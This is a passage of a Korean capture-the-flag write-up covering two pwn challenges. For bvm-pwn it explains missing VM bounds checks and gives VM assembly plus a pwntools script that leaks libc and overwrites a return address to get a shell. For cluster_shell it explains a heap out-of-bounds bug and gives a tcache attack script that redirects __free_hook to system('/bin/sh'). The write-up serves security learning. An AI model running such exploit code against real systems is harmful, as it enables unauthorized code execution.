        <span class="k">if</span> <span class="n">first_bypass</span><span class="p">:</span>
            <span class="n">first_bypass</span> <span class="o">=</span> <span class="bp">False</span>
            <span class="k">continue</span>
        <span class="n">hour</span><span class="p">,</span> <span class="nb">min</span><span class="p">,</span> <span class="n">sec</span> <span class="o">=</span> <span class="n">x</span><span class="p">[</span><span class="mi">3</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">":"</span><span class="p">)[</span><span class="mi">1</span><span class="p">:]</span>
        <span class="n">allsec</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">min</span><span class="p">)</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">+</span> <span class="nb">int</span><span class="p">(</span><span class="n">sec</span><span class="p">)</span>
        <span class="n">relsec</span> <span class="o">=</span> <span class="n">allsec</span> <span class="o">-</span> <span class="mi">3111</span>
            
        <span class="k">if</span> <span class="p">(</span><span class="n">relsec</span> <span class="o">-</span> <span class="n">prevsec</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mf">2.5</span><span class="p">:</span>
            <span class="n">temp</span> <span class="o">+=</span> <span class="s">"1"</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">temp</span> <span class="o">+=</span> <span class="s">"0"</span>
        
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">temp</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">temp</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>
            <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
            <span class="n">temp</span> <span class="o">=</span> <span class="s">""</span>
        
        <span class="n">prevsec</span> <span class="o">=</span> <span class="n">relsec</span>
</code></pre></div></div>

<p><br></p>

<p><br></p>

<h1 id="️-pwn">
<a class="anchor" href="#%EF%B8%8F-pwn" aria-hidden="true"><span class="octicon octicon-link"></span></a>🖥️ PWN</h1>

<h2 id="bvm-pwn">
<a class="anchor" href="#bvm-pwn" aria-hidden="true"><span class="octicon octicon-link"></span></a>bvm-pwn</h2>

<hr>

<p><img src="/assets/bob/bob962.png" alt="/assets/bob/bob962.png"></p>

<p>bvm에서 일부 경계 검사를 수행하지 않는 루틴을 이용하여 stack 영역 변조 및 쉘 획득</p>

<p>bvm opcode를 해석하고 실행하는 과정에서 총 3가지 취약점이 존재한다.</p>

<ol>
  <li>
<code class="highlighter-rouge">COMP reg, reg</code> opcode에서 left register index에 대해서는 경계 검사를 하지만 right register index는 경계 검사를 하지 않아, 경계를 넘는 register index를 참조하여 255번 반복 비교를 통해 일부 stack 영역을 간접적으로 leak 할 수 있다.</li>
</ol>

<p><img src="/assets/bob/bob963.png" alt="/assets/bob/bob963.png"></p>

<ol>
  <li>
<code class="highlighter-rouge">LSHIRT/RSHIFT reg, reg, reg</code>  opcode에서 left register index에 대한 경계 검사를 하지 않아 일부 stack 영역을 덮을 수 있다.</li>
</ol>

<p><img src="/assets/bob/bob964.png" alt="/assets/bob/bob964.png"></p>

<ol>
  <li>
<code class="highlighter-rouge">MOVE reg, [reg]</code>  opcode에서 register index에 대한 경계 검사는 하지만 <code class="highlighter-rouge">vm-&gt;reg[right_idx]</code>가 <code class="highlighter-rouge">vm-&gt;size</code>보다 큰지에 대한 검사를 하지않아 일부 stack 영역을 leak 할 수 있다.
3번의 경우 사실 의도하지 않은 취약점으로, 대회 도중 패킷 모니터링을 했을 때 플래그를 획득한 4분 모두 1번 대신 이 취약점을 이용하였다.</li>
</ol>

<p><img src="/assets/bob/bob965.png" alt="/assets/bob/bob965.png"></p>

<p>위 취약점으로 main return address를 leak하여 libc 주소를 얻고 oneshot gadget를 계산하여 다시 main return address를 덮으면 쉘을 획득할 수 있다.</p>

<p>마지막으로 취약점을 트리거하는 vm code를 작성해야한다.</p>

<p><strong>pwn.asm</strong></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.LEAK_DATA
empty 8

.LEAK_WORD_1
MOVE cx, 0
:LABEL_1
COMP cx, 18x
MOVE ax, cx
ADD cx, 1
JNE LABEL_1
RETURN

.LEAK_WORD_2
MOVE cx, 0
:LABEL_2
COMP cx, 19x
MOVE ax, cx
ADD cx, 1
JNE LABEL_2
RETURN

.LEAK_WORD_3
MOVE cx, 0
:LABEL_3
COMP cx, 20x
MOVE ax, cx
ADD cx, 1
JNE LABEL_3
RETURN

.LEAK_WORD_4
MOVE cx, 0
:LABEL_4
COMP cx, 21x
MOVE ax, cx
ADD cx, 1
JNE LABEL_4
RETURN

.MAIN
// leak libc
CALL LEAK_WORD_1
MOVE bx, SECTION#LEAK_DATA
ADD bx, 0
MOVE [bx], ax

CALL LEAK_WORD_2
MOVE bx, SECTION#LEAK_DATA
ADD bx, 2
MOVE [bx], ax

CALL LEAK_WORD_3
MOVE bx, SECTION#LEAK_DATA
ADD bx, 4
MOVE [bx], ax

CALL LEAK_WORD_4
MOVE bx, SECTION#LEAK_DATA
ADD bx, 6
MOVE [bx], ax

// leak
MOVE cx, 8
MOVE bx, SECTION#LEAK_DATA
MOVE ax, 1
SYSCALL

// write SECTION#LEAK_DATA
MOVE ax, 0
SYSCALL

// overwrite
MOVE bx, 0
MOVE ax, SECTION#LEAK_DATA
MOVE dx, [ax]
LSHIFT 18x, dx, bx

ADD ax, 2
MOVE dx, [ax]
LSHIFT 19x, dx, bx

ADD ax, 2
MOVE dx, [ax]
LSHIFT 20x, dx, bx

ADD ax, 2
MOVE dx, [ax]
LSHIFT 21x, dx, bx
RETURN
</code></pre></div></div>

<p>pwn.asm에서 표현된 18x, 19x 등의 레지스터는 원래는 존재하지 않는 레지스터로, return address를 가리키도록 조작된 opcode이다.</p>

<p><strong>exploit poc</strong></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">hashlib</span><span class="p">,</span> <span class="n">secrets</span><span class="p">,</span> <span class="n">re</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"localhost"</span><span class="p">,</span> <span class="mi">12001</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">decode</span><span class="p">()</span>
<span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r'\"[^)]*\"'</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
<span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="o">=</span> <span class="n">k</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"parsed (k, v) = ({}, {})"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">))</span>

<span class="n">pg</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"PoW"</span><span class="p">)</span>
<span class="n">pg</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">"solving ..."</span><span class="p">)</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">x</span> <span class="o">=</span> <span class="n">secrets</span><span class="p">.</span><span class="n">token_hex</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha256</span><span class="p">((</span><span class="n">k</span> <span class="o">+</span> <span class="n">x</span><span class="p">).</span><span class="n">encode</span><span class="p">()).</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">5</span><span class="p">]</span> <span class="o">==</span> <span class="n">v</span><span class="p">:</span>
        <span class="n">pg</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"solved [x = {}]"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
        <span class="k">break</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">"QlZNAAYSABoALAA+AFAAYgAFAAAAAAAAAAABAgAAGQISEQACAgIBAAweAA4BAgAAGQITEQACAgIBAAwwAA4BAgAAGQIUEQACAgIBAAxCAA4BAgAAGQIVEQACAgIBAAxUAA4NGgBBAQACAQAAMQEADSwAQQEAAgECADEBAA0+AEEBAAIBBAAxAQANUABBAQACAQYAMQEAAQIIAEEBAAEAAQAPAQAAAA8BAQAAQQAAIQMABxIDAQIAAgAhAwAHEwMBAgACACEDAAcUAwECAAIAIQMABxUDAQ4="</span>
<span class="c1"># payload = b64e(open("pwn.bvm", "rb").read()
</span><span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"x = "</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"loading ...</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x021b97</span> <span class="c1"># libc_base
</span><span class="n">r</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"libc: {:x}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">libc</span><span class="p">))</span>
<span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="mh">0x4f365</span><span class="p">))</span> <span class="c1"># oneshot
</span><span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="c1"># cat flag
# bob{B0undary_cheCK_1s_e2sy_T0_f0rg2t}
</span></code></pre></div></div>

<p><br></p>

<p><br></p>

<h2 id="cluster_shell">
<a class="anchor" href="#cluster_shell" aria-hidden="true"><span class="octicon octicon-link"></span></a>cluster_shell</h2>

<hr>

<p><img src="/assets/bob/bob966.png" alt="/assets/bob/bob966.png"></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>libc 2.31 heap oob문제
</code></pre></div></div>
<ul>
  <li>vim처럼 만든 메모장 기능과 유사 쉘 프롬프트</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sh# <span class="nb">help</span>
<span class="o">========================================</span>
<span class="nb">help</span>    - Help
<span class="nb">ls</span>      - List of files
<span class="nb">cat</span>     - Print the contents
<span class="nb">rm</span>      - Remove file
vim     - Text editor
<span class="o">========================================</span>
sh# <span class="nb">ls</span>
 - 1
sh# <span class="nb">cat </span>1

 aaaa

sh# vim 1
<span class="c">##################</span>
<span class="c">#_aaaa...........#</span>
<span class="c">#................#</span>
<span class="c">#................#</span>
<span class="c">#................#</span>
<span class="c">#................#</span>
<span class="c">#................#</span>
<span class="c">#................#</span>
<span class="c">#................#</span>
<span class="c">#................#</span>
<span class="c">#................#</span>
<span class="c">#................#</span>
<span class="c">#................#</span>
<span class="c">#................#</span>
<span class="c">#................#</span>
<span class="c">#................#</span>
<span class="c">#................#</span>
<span class="c">##################</span>
</code></pre></div></div>

<ul>
  <li>vim으로 파일을 하나 만들때 마다 힙에 0x110크기의 청크를 할당한다. <strong>rm</strong>으로 삭제할때 마다 free로 청크 해제 가능. 딱 봐도 메모리에 뭔가 쓰거나 할 수 있는게 <strong>vim</strong>기능밖에 없기 때문에 vim코드로 간다.</li>
  <li>sub_1980가 <strong>vim</strong>코드이고, 안의 분기에 sub_14E2가 <strong>vim</strong>모드에서 커서를 움직이는 코드. switch문으로 jmp로 해당 루틴으로 들어간다. sub_149E가 oob방지를 위한 boundary check함수</li>
</ul>

<p><img src="/assets/bob/bob967.png" alt="/assets/bob/bob967.png"></p>

<ul>
  <li>qword_5058이 vim모드에서 커서의 위치이다. 커서의 위치가 움직이는 코드에는 모두 위 boundary check함수가 있어야 한다.</li>
</ul>

<p><img src="/assets/bob/bob968.png" alt="/assets/bob/bob968.png"></p>

<ul>
  <li>하지만 같은 영역내에 boundary check함수 없이 커서의 위치를 조작하는 기능이 있다. 이를 이용해 vim note내에서 oob취약점을 트리거 하여 힙 영역내에 청크를 조작할 수 있다.</li>
  <li>switch문을 분석하면 jmp코드를 어디로 탈지 테이블이 있다.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x800153c:   lea    0x1ac5<span class="o">(</span>%rip<span class="o">)</span>,%rdx        <span class="c"># 0x8003008</span>
<span class="o">=&gt;</span> 0x8001543:   add    %rdx,%rax
   0x8001546:   notrack jmpq <span class="k">*</span>%rax
</code></pre></div></div>

<ul>
  <li>
<code class="highlighter-rouge">0x8003008</code> + [테이블 데이터]로 점프를 타는데 점프를 탈 곳을 위에서 찾은 취약한 함수가 있는곳을 찾는다. 찾는 값은 0x8003008 + X = 0x8001608이므로</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> hex<span class="o">(</span>0x8001608-0x8003008&amp;0xffffffff<span class="o">)</span>
<span class="s1">'0xffffe600'</span>
</code></pre></div></div>

<ul>
  <li>해당 값은 0x8003008[0x27]번째에 있다.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> x/128wx 0x8003008
0x8003008:      0xffffe640      0xffffe64e      0xffffe64e      0xffffe64e
0x8003018:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003028:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003038:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003048:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003058:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003068:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003078:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003088:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003098:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe600
0x80030a8:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x80030b8:      0xffffe64e      0xffffe64e      0xffffe541      0xffffe5f2
0x80030c8:      0xffffe56f      0xffffe59d      0xffffe5cb      0xffffe64e
0x80030d8:      0xffffe64e      0xffffe620      0x6f4e0020      0x6c696620
<span class="o">(</span>gdb<span class="o">)</span> x/wx 0x8003008+0x27<span class="k">*</span>4
0x80030a4:      0xffffe600
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:0000000000001513                 movzx   eax, byte ptr <span class="o">[</span>rbp-9]
.text:0000000000001517                 movsx   eax, al
.text:000000000000151A                 sub     eax, 3Ah <span class="p">;</span> <span class="s1">':'</span>
.text:000000000000151D                 cmp     eax, 35h <span class="p">;</span> <span class="s1">'5'</span>
.text:0000000000001520                 ja      loc_1656
.text:0000000000001526                 mov     eax, eax
</code></pre></div></div>

<ul>
  <li>switch계산에서 [사용자의 입력] - 0x3a를 하니 더하면 문자 <code class="highlighter-rouge">a</code>가 된다.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> chr<span class="o">(</span>0x27+0x3a<span class="o">)</span>
<span class="s1">'a'</span>
</code></pre></div></div>

<ul>
  <li>vim모드에서 a문자를 입력할 시 다음과 같은 코드의 실행을 알게 된다.</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mov</span>     <span class="n">rax</span><span class="p">,</span> <span class="n">cs</span><span class="o">:</span><span class="n">qword_5058</span>
<span class="n">add</span>     <span class="n">rax</span><span class="p">,</span> <span class="mi">1</span>
<span class="n">mov</span>     <span class="n">cs</span><span class="o">:</span><span class="n">qword_5058</span><span class="p">,</span> <span class="n">rax</span>
<span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span><span class="n">ABCD0001h</span>
<span class="n">mov</span>     <span class="n">cs</span><span class="o">:</span><span class="n">qword_5010</span><span class="p">,</span> <span class="n">rax</span>
<span class="n">jmp</span>     <span class="kt">short</span> <span class="n">loc_1663</span>
</code></pre></div></div>

<ul>
  <li>이 뒤부터는 oob를 이용해 코드를 볼 필요 없이 메모리만 보면서 취약점의 트리거가 가능하다.</li>
  <li>다양한 방법으로 취약점을 트리거 할 수 있지만 나는 tcache bin attack으로 <code class="highlighter-rouge">__free_hook</code>에 <code class="highlighter-rouge">system</code>을 덮어서 트리거하였다.</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>

<span class="n">oob</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x481</span><span class="p">))</span>
<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li>heap chunk 6개 할당하고 1번 힙의 크기를 0x480으로 바꿔 unsorted bin으로 바꾸고 해제하여 libc의 주소를 바로 구할 수 있다. <code class="highlighter-rouge">oob</code>는 0번째 힙 청크의 바로 뒤에 적기 시작하는 함수이다.</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x121</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mh">0x110</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x361</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x110</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x121</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="n">e</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="err">'</span><span class="n">__free_hook</span><span class="err">'</span><span class="p">]</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span>
<span class="n">oob</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li>4번 3번 청크를 해제해 tcache bin을 만들고 위에서 leak한 libc의 주소를 가져와 oob취약점으로 tcache bin의 다음 할당될 공간을 바꾼다. tcache bin은 사이즈 체크같은 귀찮은게 없어서 편하다.</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">alloc</span><span class="p">(</span><span class="err">'</span><span class="n">AA</span><span class="err">'</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"sh# "</span><span class="p">,</span> <span class="n">f</span><span class="s">"vim /bin/sh"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"#"</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">b</span><span class="s">"i"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="n">e</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="err">'</span><span class="n">system</span><span class="err">'</span><span class="p">]))</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"#"</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">":q"</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="err">'</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="err">'</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li>
<code class="highlighter-rouge">__free_hook</code>을 <code class="highlighter-rouge">system</code>으로 덮고 호출.</li>
</ul>

<h3 id="exploit">exploit</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="s">'''
cluster_shell

in honestly, this is not has a relationship the clustering.

nc pwn.wwwlk.kr 13337

libc: http://pwn.wwwlk.kr/libc.so.6
md5: 10fdeb77eea525914332769e9cd912ae

binary: http://pwn.wwwlk.kr/cluster_shell
md5: a5960d98860dc3d5bf82ba82b0fe6dca
'''</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># context.log_level = 'debug'
</span>
<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
   <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"sh# "</span><span class="p">,</span> <span class="s">f"vim </span><span class="si">{</span><span class="n">n</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
   <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"#"</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">)</span>
   <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"#"</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">)</span>
   <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">":q"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
   <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"sh# "</span><span class="p">,</span> <span class="s">f"rm </span><span class="si">{</span><span class="n">n</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">oob</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
   <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"sh# "</span><span class="p">,</span> <span class="s">f"vim </span><span class="si">{</span><span class="n">n</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
   <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">b"j"</span> <span class="o">*</span> <span class="mh">0xf</span> <span class="o">+</span> <span class="s">b"l"</span> <span class="o">*</span> <span class="mh">0xf</span> <span class="o">+</span> <span class="s">b'a'</span> <span class="o">+</span> <span class="n">value</span><span class="p">)</span>
   <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">":q"</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
codebase
c
'''</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./a.out"</span><span class="p">)</span>
<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>

<span class="n">oob</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x481</span><span class="p">))</span>
<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"sh# "</span><span class="p">,</span> <span class="s">"ls"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">" - "</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">" - "</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">" - "</span><span class="p">)</span>
<span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">b'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mh">0x1ebbe0</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">f"leak: 0x</span><span class="si">{</span><span class="n">leak</span><span class="p">:</span><span class="n">x</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x121</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">b"A"</span> <span class="o">*</span> <span class="mh">0x110</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x361</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">b"A"</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x110</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x121</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="n">e</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__free_hook'</span><span class="p">]</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span>
<span class="n">oob</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="s">'AA'</span><span class="p">)</span>
